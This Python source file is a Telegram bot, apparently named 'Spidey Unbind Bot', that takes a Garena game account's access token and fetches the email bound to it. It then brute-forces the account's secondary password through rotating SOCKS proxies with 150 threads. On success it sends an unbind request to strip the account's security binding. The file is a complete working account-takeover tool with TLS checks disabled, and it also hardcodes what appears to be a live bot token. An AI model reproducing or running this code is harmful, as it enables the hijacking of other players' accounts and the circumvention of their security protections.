#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import hashlib
import threading
import asyncio
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import logging
import signal

import requests
import urllib3
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError
from telegram.request import HTTPXRequest

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============== CONFIG ===============
ADMIN_IDS = [5927293826]
BOT_TOKEN = os.getenv("SPIDEY_BOT_TOKEN", "8646981427:AAENENGOAMr6HuFFPswUrNYUeGetpvurndc")
HLO_FILE = "HLO.txt"
MAX_WORKERS = 150
PROXY_FILE = "proxy.txt"          # ONLY this file – no fallback list
CONNECT_TIMEOUT = 15.0
READ_TIMEOUT = 30.0
POLL_INTERVAL = 1.0

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
                    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()])
logger = logging.getLogger(__name__)

# =============== GLOBALS ===============
current_proxy = None
stop_workers = threading.Event()
found_code = None
found_identity_token = None
found_lock = threading.Lock()
processed_counter_lock = threading.Lock()
processed_counter = [0]
total_codes = 0
current_code_being_tested = ""
progress_message = None
progress_text = ""
bot_task_running = False

# =============== PROXY LOADER ===============
def load_proxy_list():
    """Read proxies from PROXY_FILE, return list of strings like 'ip:port'."""
    if not os.path.exists(PROXY_FILE):
        logger.warning(f"{PROXY_FILE} not found – no proxies loaded.")
        return []
    with open(PROXY_FILE, "r") as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return lines

async def test_proxy(proxy_url: str, timeout: float = 5.0) -> bool:
    try:
        async with httpx.AsyncClient(proxy=proxy_url, timeout=timeout) as client:
            resp = await client.get("http://httpbin.org/ip")
            return resp.status_code == 200
    except Exception:
        return False

async def find_working_proxy():
    """Scan proxies from file, return first working SOCKS4 URL, or None."""
    proxies = load_proxy_list()
    if not proxies:
        logger.info("No proxies in file – running direct.")
        return None
    logger.info(f"Scanning {len(proxies)} proxies from {PROXY_FILE}...")
    for entry in proxies:
        # Assume SOCKS4 – you can also support SOCKS5 if you change the scheme
        proxy_url = f"socks4://{entry}"
        if await test_proxy(proxy_url):
            logger.info(f"✅ Working proxy: {proxy_url}")
            return proxy_url
        else:
            logger.debug(f"❌ Dead: {proxy_url}")
    logger.warning("No proxy works – running direct.")
    return None

def get_proxy_dict():
    if current_proxy:
        return {"http": current_proxy, "https": current_proxy}
    return None

# =============== SPIDEY SHIT ===============
def get_bound_email(access_token):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        params = {'app_id': '100067', 'access_token': access_token}
        headers = {'User-Agent': 'GarenaMSDK/4.0.30'}
        proxies = get_proxy_dict()
        resp = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=10, verify=False)
        if resp.status_code != 200:
            return None, f"API error: HTTP {resp.status_code}"
        data = resp.json()
        email = data.get('email')
        if not email:
            return None, "No email bound."
        return email, None
    except Exception as e:
        return None, f"Failed: {str(e)}"

def verify_code(email, access_token, hashed_code):
    if stop_workers.is_set():
        return None
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.30',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
    }
    data = {
        'email': email,
        'app_id': '100067',
        'access_token': access_token,
        'secondary_password': hashed_code
    }
    proxies = get_proxy_dict()
    try:
        resp = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=8, verify=False)
        if resp.status_code != 200:
            return None
        json_data = resp.json()
        return json_data.get('identity_token')
    except Exception:
        return None

def worker_task(email, access_token, code_queue, total):
    global current_code_being_tested
    while not stop_workers.is_set():
        try:
            code = code_queue.get(timeout=0.5)
        except:
            break
        if stop_workers.is_set():
            break
        current_code_being_tested = code
        hashed = hashlib.sha256(code.encode('utf-8')).hexdigest()
        with processed_counter_lock:
            processed_counter[0] += 1
        token = verify_code(email, access_token, hashed)
        if token:
            with found_lock:
                if not stop_workers.is_set():
                    stop_workers.set()
                    global found_code, found_identity_token
                    found_code = code
                    found_identity_token = token
            break

def run_bruteforce(email, access_token, codes):
    global stop_workers, found_code, found_identity_token, processed_counter, total_codes
    stop_workers.clear()
    found_code = None
    found_identity_token = None
    processed_counter = [0]
    total_codes = len(codes)
    code_queue = Queue()
    for c in codes:
        code_queue.put(c)
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(worker_task, email, access_token, code_queue, total_codes) for _ in range(MAX_WORKERS)]
        for future in as_completed(futures):
            if stop_workers.is_set():
                for f in futures:
                    f.cancel()
                break
    return (found_code is not None), found_code, found_identity_token

# =============== TELEGRAM HANDLERS ===============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    proxy_status = f"Proxy: `{current_proxy}`" if current_proxy else "Proxy: None (direct)"
    await update.message.reply_text(
        f"🔐 *Spidey Unbind Bot*\n\n"
        f"Commands:\n"
        f"/unbind <access_token> – start unbind\n"
        f"/setproxy <proxy_url> – manually override proxy\n"
        f"/proxy – show current proxy\n\n"
        f"{proxy_status}\n\n"
        f"Codes file: `{HLO_FILE}`\nProxy file: `{PROXY_FILE}`",
        parse_mode="Markdown"
    )

async def show_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(f"Current proxy: `{current_proxy}`" if current_proxy else "No proxy (direct)", parse_mode="Markdown")

async def set_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_proxy
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("❌ Provide proxy URL (http://, https://, socks5:// or socks4://)")
        return
    proxy_url = args[0].strip()
    if proxy_url.startswith(("http://", "https://", "socks5://", "socks4://")):
        current_proxy = proxy_url
        # Save to file
        with open(PROXY_FILE, "w") as f:
            f.write(proxy_url.split("://")[1] + "\n")   # save only ip:port for simplicity
        await update.message.reply_text(f"✅ Proxy set to: `{proxy_url}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Invalid format. Must start with scheme.")

async def unbind(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_task_running, progress_message, progress_text
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if bot_task_running:
        await update.message.reply_text("⏳ Another task is running.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("❌ Provide access token: `/unbind token`", parse_mode="Markdown")
        return
    access_token = args[0].strip()
    if not access_token:
        await update.message.reply_text("❌ Token empty.")
        return
    if not os.path.exists(HLO_FILE):
        await update.message.reply_text(f"❌ `{HLO_FILE}` not found.", parse_mode="Markdown")
        return
    with open(HLO_FILE, "r") as f:
        codes = [line.strip() for line in f if line.strip()]
    if not codes:
        await update.message.reply_text(f"❌ `{HLO_FILE}` is empty.", parse_mode="Markdown")
        return

    status_msg = await update.message.reply_text("🔄 Fetching bound email...")
    email, error = get_bound_email(access_token)
    if error:
        await status_msg.edit_text(f"❌ {error}")
        return
    await status_msg.edit_text(f"✅ Bound email: `{email}`\n🔍 Loaded {len(codes)} codes. Starting brute-force with {MAX_WORKERS} workers...", parse_mode="Markdown")

    progress_message = await update.message.reply_text("⏳ Brute-forcing...")
    progress_text = ""
    bot_task_running = True

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, run_bruteforce, email, access_token, codes)
    success, code, identity_token = result
    bot_task_running = False

    if success:
        await progress_message.edit_text(f"✅ **SUCCESS!**\nCracked code: `{code}`\n\nSending unbind request...", parse_mode="Markdown")
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        headers = {
            'User-Agent': 'GarenaMSDK/4.0.30',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'app_id': '100067',
            'access_token': access_token,
            'identity_token': identity_token
        }
        proxies = get_proxy_dict()
        try:
            resp = requests.post(unbind_url, headers=headers, data=data, proxies=proxies, timeout=10, verify=False)
            await update.message.reply_text(f"📨 *Unbind Response:*\n```\n{resp.text}\n```", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Unbind request failed: {str(e)}")
    else:
        await progress_message.edit_text("❌ No valid code found in HLO.txt.")

async def progress_updater(context: ContextTypes.DEFAULT_TYPE):
    global progress_message, progress_text, processed_counter, total_codes, current_code_being_tested
    if not progress_message or not bot_task_running:
        return
    count = processed_counter[0] if processed_counter else 0
    total = total_codes
    current = current_code_being_tested
    new_text = f"⏳ Testing: `{current}`\nProgress: {count}/{total} ({count*100//total if total else 0}%)"
    if new_text != progress_text:
        progress_text = new_text
        try:
            await progress_message.edit_text(progress_text, parse_mode="Markdown")
        except Exception:
            pass

# =============== POLLING WITH RETRIES ===============
def run_with_retries(app: Application):
    backoff = 1.0
    max_backoff = 60.0
    while True:
        try:
            logger.info("Starting polling loop...")
            app.run_polling(poll_interval=POLL_INTERVAL, close_loop=False, stop_signals=None)
            break
        except NetworkError as e:
            logger.error(f"NetworkError: {e}. Reconnecting in {backoff:.0f}s...")
            time.sleep(backoff)
            backoff = min(backoff * 2, max_backoff)
        except Exception as e:
            logger.critical(f"Unhandled error: {e}. Retrying in 10s.")
            time.sleep(10)
            backoff = 1.0

# =============== MAIN ===============
async def main():
    global current_proxy
    # Find proxy from file only
    working_proxy = await find_working_proxy()
    current_proxy = working_proxy  # could be None

    # Build Application request with the configured proxy and timeouts
    request = HTTPXRequest(
        proxy=current_proxy,
        connect_timeout=CONNECT_TIMEOUT,
        read_timeout=READ_TIMEOUT,
    )

    app = Application.builder().token(BOT_TOKEN).request(request).build()
    app.bot_data["start_time"] = datetime.now()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("unbind", unbind))
    app.add_handler(CommandHandler("setproxy", set_proxy_command))
    app.add_handler(CommandHandler("proxy", show_proxy))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(progress_updater, interval=3, first=0)

    return app

if __name__ == "__main__":
    try:
        app = asyncio.run(main())
        run_with_retries(app)
    except KeyboardInterrupt:
        logger.info("Bot stopped by user.")
        sys.exit(0)
